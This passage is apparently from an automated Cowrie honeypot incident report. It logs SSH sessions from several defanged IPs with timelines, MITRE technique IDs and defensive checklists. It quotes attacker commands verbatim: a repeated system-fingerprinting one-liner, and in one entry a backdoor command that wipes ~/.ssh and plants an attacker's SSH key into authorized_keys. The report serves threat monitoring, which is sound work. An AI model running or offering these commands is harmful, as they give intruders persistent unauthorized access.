| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:09:37` | `cowrie.session.connect` |
| `2026-09-03 15:09:37` | `cowrie.client.version` |
| `2026-09-03 15:09:37` | `cowrie.client.kex` |
| `2026-09-03 15:09:38` | `cowrie.login.success` |
| `2026-09-03 15:09:40` | `cowrie.session.params` |
| `2026-09-03 15:09:40` | `cowrie.command.input` |
| `2026-09-03 15:09:40` | `cowrie.command.input` |
| `2026-09-03 15:09:40` | `cowrie.command.input` |
| `2026-09-03 15:09:40` | `cowrie.command.input` |
| `2026-09-03 15:09:40` | `cowrie.command.input` |
| `2026-09-03 15:09:40` | `cowrie.command.success` |
| `2026-09-03 15:09:40` | `cowrie.command.input` |
| `2026-09-03 15:09:40` | `cowrie.command.input` |
| `2026-09-03 15:09:40` | `cowrie.command.input` |
| `2026-09-03 15:09:40` | `cowrie.command.input` |
| `2026-09-03 15:09:40` | `cowrie.log.closed` |
| `2026-09-03 15:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4bf3007451c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:11 |
| **Last Seen** | 2026-09-03 15:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:11:50` | `cowrie.session.connect` |
| `2026-09-03 15:11:50` | `cowrie.client.version` |
| `2026-09-03 15:11:50` | `cowrie.client.kex` |
| `2026-09-03 15:11:50` | `cowrie.login.success` |
| `2026-09-03 15:11:52` | `cowrie.session.params` |
| `2026-09-03 15:11:52` | `cowrie.command.input` |
| `2026-09-03 15:11:52` | `cowrie.command.input` |
| `2026-09-03 15:11:52` | `cowrie.command.input` |
| `2026-09-03 15:11:52` | `cowrie.command.input` |
| `2026-09-03 15:11:52` | `cowrie.command.input` |
| `2026-09-03 15:11:52` | `cowrie.command.success` |
| `2026-09-03 15:11:52` | `cowrie.command.input` |
| `2026-09-03 15:11:52` | `cowrie.command.input` |
| `2026-09-03 15:11:52` | `cowrie.command.input` |
| `2026-09-03 15:11:52` | `cowrie.command.input` |
| `2026-09-03 15:11:52` | `cowrie.log.closed` |
| `2026-09-03 15:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4da1ed6c74b8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:14 |
| **Last Seen** | 2026-09-03 15:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:14:08` | `cowrie.session.connect` |
| `2026-09-03 15:14:08` | `cowrie.client.version` |
| `2026-09-03 15:14:08` | `cowrie.client.kex` |
| `2026-09-03 15:14:09` | `cowrie.login.success` |
| `2026-09-03 15:14:10` | `cowrie.session.params` |
| `2026-09-03 15:14:10` | `cowrie.command.input` |
| `2026-09-03 15:14:10` | `cowrie.command.input` |
| `2026-09-03 15:14:10` | `cowrie.command.input` |
| `2026-09-03 15:14:10` | `cowrie.command.input` |
| `2026-09-03 15:14:10` | `cowrie.command.input` |
| `2026-09-03 15:14:10` | `cowrie.command.success` |
| `2026-09-03 15:14:10` | `cowrie.command.input` |
| `2026-09-03 15:14:10` | `cowrie.command.input` |
| `2026-09-03 15:14:10` | `cowrie.command.input` |
| `2026-09-03 15:14:10` | `cowrie.command.input` |
| `2026-09-03 15:14:10` | `cowrie.log.closed` |
| `2026-09-03 15:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79a53ab33754

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 15:14 |
| **Last Seen** | 2026-09-03 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:14:51` | `cowrie.session.connect` |
| `2026-09-03 15:14:51` | `cowrie.client.version` |
| `2026-09-03 15:14:51` | `cowrie.client.kex` |
| `2026-09-03 15:14:52` | `cowrie.login.success` |
| `2026-09-03 15:14:52` | `cowrie.direct-tcpip.request` |
| `2026-09-03 15:14:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 15:14:52` | `cowrie.direct-tcpip.data` |
| `2026-09-03 15:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88cda57faecf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:16 |
| **Last Seen** | 2026-09-03 15:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:16:26` | `cowrie.session.connect` |
| `2026-09-03 15:16:26` | `cowrie.client.version` |
| `2026-09-03 15:16:27` | `cowrie.client.kex` |
| `2026-09-03 15:16:27` | `cowrie.login.success` |
| `2026-09-03 15:16:28` | `cowrie.session.params` |
| `2026-09-03 15:16:28` | `cowrie.command.input` |
| `2026-09-03 15:16:28` | `cowrie.command.input` |
| `2026-09-03 15:16:28` | `cowrie.command.input` |
| `2026-09-03 15:16:28` | `cowrie.command.input` |
| `2026-09-03 15:16:28` | `cowrie.command.input` |
| `2026-09-03 15:16:28` | `cowrie.command.success` |
| `2026-09-03 15:16:28` | `cowrie.command.input` |
| `2026-09-03 15:16:28` | `cowrie.command.input` |
| `2026-09-03 15:16:28` | `cowrie.command.input` |
| `2026-09-03 15:16:28` | `cowrie.command.input` |
| `2026-09-03 15:16:29` | `cowrie.log.closed` |
| `2026-09-03 15:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a51baa023b03

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:18 |
| **Last Seen** | 2026-09-03 15:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:18:46` | `cowrie.session.connect` |
| `2026-09-03 15:18:46` | `cowrie.client.version` |
| `2026-09-03 15:18:46` | `cowrie.client.kex` |
| `2026-09-03 15:18:47` | `cowrie.login.success` |
| `2026-09-03 15:18:49` | `cowrie.session.params` |
| `2026-09-03 15:18:49` | `cowrie.command.input` |
| `2026-09-03 15:18:49` | `cowrie.command.input` |
| `2026-09-03 15:18:49` | `cowrie.command.input` |
| `2026-09-03 15:18:49` | `cowrie.command.input` |
| `2026-09-03 15:18:49` | `cowrie.command.input` |
| `2026-09-03 15:18:49` | `cowrie.command.success` |
| `2026-09-03 15:18:49` | `cowrie.command.input` |
| `2026-09-03 15:18:49` | `cowrie.command.input` |
| `2026-09-03 15:18:49` | `cowrie.command.input` |
| `2026-09-03 15:18:49` | `cowrie.command.input` |
| `2026-09-03 15:18:49` | `cowrie.log.closed` |
| `2026-09-03 15:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def723eb50d8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 15:19 |
| **Last Seen** | 2026-09-03 15:20 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:19:45` | `cowrie.session.connect` |
| `2026-09-03 15:19:46` | `cowrie.client.version` |
| `2026-09-03 15:19:46` | `cowrie.client.kex` |
| `2026-09-03 15:19:47` | `cowrie.login.success` |
| `2026-09-03 15:19:49` | `cowrie.direct-tcpip.request` |
| `2026-09-03 15:19:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 15:19:51` | `cowrie.direct-tcpip.data` |
| `2026-09-03 15:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0db6f1a89df2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:21 |
| **Last Seen** | 2026-09-03 15:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:21:11` | `cowrie.session.connect` |
| `2026-09-03 15:21:11` | `cowrie.client.version` |
| `2026-09-03 15:21:11` | `cowrie.client.kex` |
| `2026-09-03 15:21:13` | `cowrie.login.success` |
| `2026-09-03 15:21:14` | `cowrie.session.params` |
| `2026-09-03 15:21:14` | `cowrie.command.input` |
| `2026-09-03 15:21:14` | `cowrie.command.input` |
| `2026-09-03 15:21:14` | `cowrie.command.input` |
| `2026-09-03 15:21:14` | `cowrie.command.input` |
| `2026-09-03 15:21:14` | `cowrie.command.input` |
| `2026-09-03 15:21:14` | `cowrie.command.success` |
| `2026-09-03 15:21:14` | `cowrie.command.input` |
| `2026-09-03 15:21:14` | `cowrie.command.input` |
| `2026-09-03 15:21:14` | `cowrie.command.input` |
| `2026-09-03 15:21:14` | `cowrie.command.input` |
| `2026-09-03 15:21:14` | `cowrie.log.closed` |
| `2026-09-03 15:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f25d8772f00

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:23 |
| **Last Seen** | 2026-09-03 15:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:23:40` | `cowrie.session.connect` |
| `2026-09-03 15:23:40` | `cowrie.client.version` |
| `2026-09-03 15:23:40` | `cowrie.client.kex` |
| `2026-09-03 15:23:41` | `cowrie.login.success` |
| `2026-09-03 15:23:43` | `cowrie.session.params` |
| `2026-09-03 15:23:43` | `cowrie.command.input` |
| `2026-09-03 15:23:43` | `cowrie.command.input` |
| `2026-09-03 15:23:43` | `cowrie.command.input` |
| `2026-09-03 15:23:43` | `cowrie.command.input` |
| `2026-09-03 15:23:43` | `cowrie.command.input` |
| `2026-09-03 15:23:43` | `cowrie.command.success` |
| `2026-09-03 15:23:43` | `cowrie.command.input` |
| `2026-09-03 15:23:43` | `cowrie.command.input` |
| `2026-09-03 15:23:43` | `cowrie.command.input` |
| `2026-09-03 15:23:43` | `cowrie.command.input` |
| `2026-09-03 15:23:43` | `cowrie.log.closed` |
| `2026-09-03 15:23:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abe7ec143d5e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 15:25 |
| **Last Seen** | 2026-09-03 15:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:25:11` | `cowrie.session.connect` |
| `2026-09-03 15:25:11` | `cowrie.client.version` |
| `2026-09-03 15:25:11` | `cowrie.client.kex` |
| `2026-09-03 15:25:13` | `cowrie.login.success` |
| `2026-09-03 15:25:13` | `cowrie.direct-tcpip.request` |
| `2026-09-03 15:25:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 15:25:13` | `cowrie.direct-tcpip.data` |
| `2026-09-03 15:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cadfe2b2eb1c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:26 |
| **Last Seen** | 2026-09-03 15:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:26:06` | `cowrie.session.connect` |
| `2026-09-03 15:26:06` | `cowrie.client.version` |
| `2026-09-03 15:26:06` | `cowrie.client.kex` |
| `2026-09-03 15:26:07` | `cowrie.login.success` |
| `2026-09-03 15:26:08` | `cowrie.session.params` |
| `2026-09-03 15:26:08` | `cowrie.command.input` |
| `2026-09-03 15:26:08` | `cowrie.command.input` |
| `2026-09-03 15:26:08` | `cowrie.command.input` |
| `2026-09-03 15:26:08` | `cowrie.command.input` |
| `2026-09-03 15:26:08` | `cowrie.command.input` |
| `2026-09-03 15:26:08` | `cowrie.command.success` |
| `2026-09-03 15:26:08` | `cowrie.command.input` |
| `2026-09-03 15:26:08` | `cowrie.command.input` |
| `2026-09-03 15:26:08` | `cowrie.command.input` |
| `2026-09-03 15:26:08` | `cowrie.command.input` |
| `2026-09-03 15:26:09` | `cowrie.log.closed` |
| `2026-09-03 15:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b1cf88c4543

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]143` |
| **First Seen** | 2026-09-03 15:26 |
| **Last Seen** | 2026-09-03 15:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:26:43` | `cowrie.session.connect` |
| `2026-09-03 15:26:43` | `cowrie.client.version` |
| `2026-09-03 15:26:43` | `cowrie.client.kex` |
| `2026-09-03 15:26:44` | `cowrie.login.success` |
| `2026-09-03 15:26:45` | `cowrie.session.params` |
| `2026-09-03 15:26:45` | `cowrie.command.input` |
| `2026-09-03 15:26:45` | `cowrie.command.failed` |
| `2026-09-03 15:26:45` | `cowrie.log.closed` |
| `2026-09-03 15:26:45` | `cowrie.session.params` |
| `2026-09-03 15:26:45` | `cowrie.command.input` |
| `2026-09-03 15:26:45` | `cowrie.session.file_download` |
| `2026-09-03 15:26:45` | `cowrie.log.closed` |
| `2026-09-03 15:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]143` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2b1d7e6d2ee

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]143` |
| **First Seen** | 2026-09-03 15:26 |
| **Last Seen** | 2026-09-03 15:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:26:46` | `cowrie.session.connect` |
| `2026-09-03 15:26:46` | `cowrie.client.version` |
| `2026-09-03 15:26:46` | `cowrie.client.kex` |
| `2026-09-03 15:26:46` | `cowrie.login.success` |
| `2026-09-03 15:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]143` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90fa4d21af9b

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]143` |
| **First Seen** | 2026-09-03 15:26 |
| **Last Seen** | 2026-09-03 15:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:26:46` | `cowrie.session.connect` |
| `2026-09-03 15:26:46` | `cowrie.client.version` |
| `2026-09-03 15:26:46` | `cowrie.client.kex` |
| `2026-09-03 15:26:47` | `cowrie.login.success` |
| `2026-09-03 15:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]143` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e42c659fbe4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:28 |
| **Last Seen** | 2026-09-03 15:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:28:22` | `cowrie.session.connect` |
| `2026-09-03 15:28:22` | `cowrie.client.version` |
| `2026-09-03 15:28:23` | `cowrie.client.kex` |
| `2026-09-03 15:28:24` | `cowrie.login.success` |
| `2026-09-03 15:28:26` | `cowrie.session.params` |
| `2026-09-03 15:28:26` | `cowrie.command.input` |
| `2026-09-03 15:28:26` | `cowrie.command.input` |
| `2026-09-03 15:28:26` | `cowrie.command.input` |
| `2026-09-03 15:28:26` | `cowrie.command.input` |
| `2026-09-03 15:28:26` | `cowrie.command.input` |
| `2026-09-03 15:28:26` | `cowrie.command.success` |
| `2026-09-03 15:28:26` | `cowrie.command.input` |
| `2026-09-03 15:28:26` | `cowrie.command.input` |
